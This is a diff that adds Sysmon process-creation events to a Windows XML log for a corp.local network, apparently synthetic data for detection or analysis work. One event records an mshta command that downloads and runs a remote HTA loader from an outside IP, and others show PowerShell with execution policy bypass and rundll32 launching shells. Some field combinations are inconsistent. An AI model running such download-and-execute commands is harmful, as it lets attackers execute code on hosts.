+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:25:41.7796514Z"/>
+      <EventRecordID>184023</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:25:41.768</Data>
+      <Data Name="ProcessGuid">{91e1aa96-9c3e-ab0e-6105-0758561e16d1}</Data>
+      <Data Name="ProcessId">9098</Data>
+      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="FileVersion">10.0.19041.3486</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">svchost.exe</Data>
+      <Data Name="CommandLine">C:\Windows\System32\svchost.exe -k netsvcs -p</Data>
+      <Data Name="CurrentDirectory">C:\Users\asingh\</Data>
+      <Data Name="User">CORP\asingh</Data>
+      <Data Name="LogonGuid">{533420e6-2e8d-7cd0-364d-cc3e5ad5cf06}</Data>
+      <Data Name="LogonId">0x522362</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">MD5=B380C73A989D9D4AE15CA6664797B2C9,SHA256=15EABB2730E912F2F2B43ABF8441AEFD0299436A8E48522346B98991E14EB70D,IMPHASH=7D137018680BAC63B856D0353DC98290</Data>
+      <Data Name="ParentProcessGuid">{8e200724-c217-3d85-b0cb-a55979e13cea}</Data>
+      <Data Name="ParentProcessId">9041</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\asingh</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:24:24.4081983Z"/>
+      <EventRecordID>184024</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:24:24.414</Data>
+      <Data Name="ProcessGuid">{4e6384bb-a9f9-94e0-5e78-8db079279973}</Data>
+      <Data Name="ProcessId">9698</Data>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1409</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">rundll32.exe</Data>
+      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
+      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+      <Data Name="User">CORP\jdoe</Data>
+      <Data Name="LogonGuid">{6cedd15d-ff23-bef5-8ce6-5a1054aebd1b}</Data>
+      <Data Name="LogonId">0xc3ee4d</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=3B048A8B405BFDC94E7ED827455AC762,SHA256=F36CB62B892E6161BE2D740A1E9B23BC50C7C006314D3441B8A6171F1EE34DC4,IMPHASH=3108D4482F65FAFAB0AE8F08C31EDBBC</Data>
+      <Data Name="ParentProcessGuid">{3764fbda-bd15-7bf4-46c8-96efb97e6703}</Data>
+      <Data Name="ParentProcessId">9595</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\jdoe</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:33:20.6054579Z"/>
+      <EventRecordID>184025</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION22.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:33:20.232</Data>
+      <Data Name="ProcessGuid">{2defe193-4d61-039f-b540-206788bd13d1}</Data>
+      <Data Name="ProcessId">5494</Data>
+      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
+      <Data Name="FileVersion">10.0.19041.187</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">mshta.exe</Data>
+      <Data Name="CommandLine">mshta.exe http://45.77.65.102/loader.hta</Data>
+      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+      <Data Name="User">CORP\jdoe</Data>
+      <Data Name="LogonGuid">{f96b648a-0df5-8da8-4ac9-f1afb289f224}</Data>
+      <Data Name="LogonId">0x3053da</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=1A432F0A7DAA39F0C0B6FCE2DE53790A,SHA256=5738811D70C2903F7A8D03AA782A65E048CA765192F5DF7B0323D342DF6A8F93,IMPHASH=40A26C600D270659F72ADA9B2F32751E</Data>
+      <Data Name="ParentProcessGuid">{f0e98b3b-dc99-7a4c-1d34-10bad2762bdc}</Data>
+      <Data Name="ParentProcessId">7565</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\jdoe</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:18:38.9442881Z"/>
+      <EventRecordID>184026</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:18:38.152</Data>
+      <Data Name="ProcessGuid">{f2f9e5fa-4dc8-15ce-fe71-1e523f897142}</Data>
+      <Data Name="ProcessId">7818</Data>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2484</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">rundll32.exe</Data>
+      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{989bc4da-ca6d-9e50-39c6-85c7c693da11}</Data>
+      <Data Name="LogonId">0x716074</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=DC33E1F94C1F55AB715629EEE893BE3D,SHA256=9C10C5720F6B40D09EFBA58B9191B3634E2D66456DC7CAC7FD72B05096A9954F,IMPHASH=F295456E19675F06BD767E35F5C9B047</Data>
+      <Data Name="ParentProcessGuid">{c342bd2b-3531-a021-3605-a91143bfd931}</Data>
+      <Data Name="ParentProcessId">2330</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:20:15.6853787Z"/>
+      <EventRecordID>184027</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION07.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:20:15.002</Data>
+      <Data Name="ProcessGuid">{735435ea-b07a-9804-784c-085b4a8ff810}</Data>
+      <Data Name="ProcessId">4792</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1181</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
+      <Data Name="CurrentDirectory">C:\Users\mrodriguez\</Data>
+      <Data Name="User">CORP\mrodriguez</Data>
+      <Data Name="LogonGuid">{b4fb0eb9-4860-b3f6-dc0f-1238743b65a2}</Data>
+      <Data Name="LogonId">0xbff875</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=CA8F3653C9AF18F843B9DA13EC856F37,SHA256=1D61FAC36CD5E85932A447B2EF04E57DCDCCC33AA9434AA096FC734DA003CD28,IMPHASH=26242B40A5CB63A2398D1CA68B6870B5</Data>
+      <Data Name="ParentProcessGuid">{e88da719-4400-d39e-2469-0f441247ea4e}</Data>
+      <Data Name="ParentProcessId">3718</Data>
+      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="ParentUser">CORP\mrodriguez</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T08:54:36.7863447Z"/>
+      <EventRecordID>184028</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WORKSTATION15.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 08:54:36.127</Data>
+      <Data Name="ProcessGuid">{b04d3376-4dd8-b321-670a-45b1f1533ae8}</Data>
+      <Data Name="ProcessId">9199</Data>
+      <Data Name="Image">C:\Windows\explorer.exe</Data>
+      <Data Name="FileVersion">10.0.19041.2212</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">explorer.exe</Data>
+      <Data Name="CommandLine">C:\Windows\explorer.exe</Data>
+      <Data Name="CurrentDirectory">C:\Users\ktanaka\</Data>
+      <Data Name="User">CORP\ktanaka</Data>
+      <Data Name="LogonGuid">{7e695d0d-7010-1497-9918-e3b10a3450fc}</Data>
+      <Data Name="LogonId">0x7e996e</Data>
+      <Data Name="TerminalSessionId">3</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=069F14F140181C6E9A8CFA3C5283AAC7,SHA256=964DB03F93403FADDC4AD56BD6016237AC9ED156F63FCE413A9ACA5E176132ED,IMPHASH=C3C75611FFE3FA49054F92FFF366BAD4</Data>
+      <Data Name="ParentProcessGuid">{ac1aa554-d248-44fe-9384-c35b0a4c9f7f}</Data>
+      <Data Name="ParentProcessId">3870</Data>
+      <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\System32\services.exe</Data>
+      <Data Name="ParentUser">CORP\ktanaka</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-07-26T09:55:31.3044882Z"/>
+      <EventRecordID>184029</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3456" ThreadID="3980"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>SRV-FILE01.corp.local</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-07-26 09:55:31.284</Data>
+      <Data Name="ProcessGuid">{ff37d19c-95d8-6f96-a281-7de1d0725b5c}</Data>
+      <Data Name="ProcessId">2494</Data>
+      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1926</Data>
+      <Data Name="Description">-</Data>
+      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">rundll32.exe</Data>
+      <Data Name="CommandLine">rundll32.exe shell32.dll,ShellExec_RunDLL</Data>
+      <Data Name="CurrentDirectory">C:\Users\SYSTEM\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{5913f9d3-6889-5553-5230-1ac7ab8ddeb4}</Data>
+      <Data Name="LogonId">0xeb9465</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">MD5=7ED70ED7B194990B6961929E546E035A,SHA256=0964FBBF8CD321B0C2B01CFDD045DD1C668409E3F1F8343EA99F131849C8A43F,IMPHASH=409D360250843242168B1625746F7891</Data>
+      <Data Name="ParentProcessGuid">{52c21221-1dad-f85e-c5c5-dd6a6778043b}</Data>
+      <Data Name="ParentProcessId">9431</Data>
+      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentCommandLine">powershell.exe -NoProfile</Data>
+      <Data Name="ParentUser">NT AUTHORITY\SYSTEM</Data>
     </EventData>
   </Event>
 </Events>
